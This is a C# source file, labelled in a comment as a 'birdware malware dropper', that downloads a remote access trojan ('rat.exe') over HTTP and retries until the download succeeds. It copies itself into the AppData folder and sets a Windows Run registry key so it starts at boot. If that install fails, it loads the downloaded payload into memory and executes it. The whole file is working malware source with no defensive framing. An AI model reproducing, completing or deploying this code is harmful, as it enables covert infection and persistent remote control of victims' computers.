using System;
using System.IO;
using System.Net;
using System.Diagnostics;
using System.Reflection;
using System.Threading;
using Microsoft.Win32;
//birdware malware dropper
namespace murdamusic
{
    class Program
    {


        public static void Main()
        {

            byte[] payloadBuffer = DownloadPayload(@"http://127.0.0.1/rat.exe");
            // byte[] payloadBuffer = DownloadPayload(@"C:\Users\arale\Desktop\Csharp-Loader-master\Csharp-Loader-master\dropper\bin\Debug\helloworld.exe");
            //struct for full path to dat %appdata%
            if (InstallPayload(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\rat.exe"))//CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run\")
                //init 0 = installed correct
                Environment.Exit(0);
            else
                //make the buffer run the payload if install failed
                RunPayload(payloadBuffer);
        }


        private static bool InstallPayload(string dropPath)
        {
            if (!Process.GetCurrentProcess().MainModule.FileName.Equals(dropPath, StringComparison.CurrentCultureIgnoreCase))
            {
                FileStream FS = null;
                try
                {
                    //check if path to appdata exists
                    if (!File.Exists(dropPath))
                        //if no file write with filestream
                        FS = new FileStream(dropPath, FileMode.CreateNew);
                    else
                        FS = new FileStream(dropPath, FileMode.Create);
                    //read proc module (rat.exe)
                    byte[] loaderBuffer = File.ReadAllBytes(Process.GetCurrentProcess().MainModule.FileName);
                    //write bytes from read (buffer/filestream) into path
                    FS.Write(loaderBuffer, 0, loaderBuffer.Length);
                    FS.Dispose();//cut off
                    //make reg here to run on boot like rootkit
                    //@"Software\Microsoft\Windows\CurrentVersion\Run\ | AUTORUN
                    //set value(path.fname), dropPath
                    Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run\").SetValue(Path.GetFileName(dropPath), dropPath);
                    Process.Start(dropPath);
                    return true;
                }
                catch
                {
                    return false;
                }
            }
            return false;
        }


        private static byte[] DownloadPayload(string url)
        {
        //fuck up fixer
        redownload:
            try
            {
                //retry req to anondeeznuts
                HttpWebRequest httpRequest = (HttpWebRequest)WebRequest.Create(url);
                httpRequest.Method = WebRequestMethods.Http.Get;
                HttpWebResponse httpResponse = (HttpWebResponse)httpRequest.GetResponse();
                Stream httpResponseStream = httpResponse.GetResponseStream();
                //hold downloaded data in memstream
                using (MemoryStream memoryStream = new MemoryStream())
                {//memcpy response -> memstream
                    httpResponseStream.CopyTo(memoryStream);
                    httpResponse.Close();// cut off
                    httpResponseStream.Dispose();//zf = 1
                    //write from buffer to byte array once zf set
                    return memoryStream.ToArray();
                }
            }
            catch
            {
                //5 sec then re-dl
                Thread.Sleep(5000);
                goto redownload;
            }

        }


        private static void RunPayload(byte[] payload)
        {
            //thread hook (may need reg key) -> doesnt
            new Thread(() =>
            {
                try
                {
                    //convert array to asm
                    //spawn ep with unique bp
                    Assembly asm = AppDomain.CurrentDomain.Load(payload);
                    MethodInfo Metinf = asm.EntryPoint;
                    //instance entrypoint class
                    object InjObj = asm.CreateInstance(Metinf.Name);
                    object[] parameters = new object[1];  // C#
                    //set params to null-> zf= 0 
                    if (Metinf.GetParameters().Length == 0)
                    {
                        parameters = null; // .net syntax to force zf
                    }
                    Metinf.Invoke(InjObj, parameters);
                }
                catch { }
            })
            //loop isBackground = true -> start()->pushes asm to buffer
            { IsBackground = false }.Start();
        }


    }
}
